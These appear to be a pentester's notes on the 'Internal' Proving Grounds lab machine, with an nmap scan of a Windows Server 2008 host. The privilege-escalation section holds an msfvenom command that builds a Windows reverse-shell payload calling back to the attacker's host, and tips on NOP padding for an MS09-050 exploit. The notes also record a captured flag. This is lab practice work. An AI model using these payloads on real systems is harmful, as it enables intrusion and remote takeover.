# Internal \[Easy]

## Report

{% embed url="https://medium.com/@ayxantanirverdiyev6/pg-practice-internal-walkthrough-49bca402f737" %}
talks about zone transfer (not possible cus we don't have domain name)
{% endembed %}

{% embed url="https://medium.com/@Dpsypher/proving-grounds-practice-internal-e5098dd29793" %}
this guy used meterpreter payload instead of standard
{% endembed %}

## Enumeration

192.168.53.40

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-10-14T03:37:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-10-14T03:37:07+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:1f:ca (VMware)
| Names:
|   INTERNAL<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  INTERNAL<20>         Flags: <unique><active>
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-13T20:37:07-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-14T03:37:07

```

### Files



### Initial Foothold



## PrivEsc

```
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 EXITFUNC=thread -f python -v shell
```

Result payload is 324 bytes

Payload size in script is 374 bytes so pad it (prepend) with 51 NOP bytes (\x90)

Does work with netcat shell do not worry msfvenom payloads are valid (Single stage)

## Loot

### Creds

None

### Flags

270843181dccb5f112421854d5bf87ab

## Proof

{% embed url="https://github.com/sec13b/ms09-050_CVE-2009-3103/tree/main" %}

{% embed url="https://blog.spookysec.net/stage-v-stageless-1/" %}
this guy says nc should catch our stageless payload&#x20;
{% endembed %}

{% embed url="https://www.geeksforgeeks.org/computer-networks/difference-between-bind-shell-and-reverse-shell/" %}
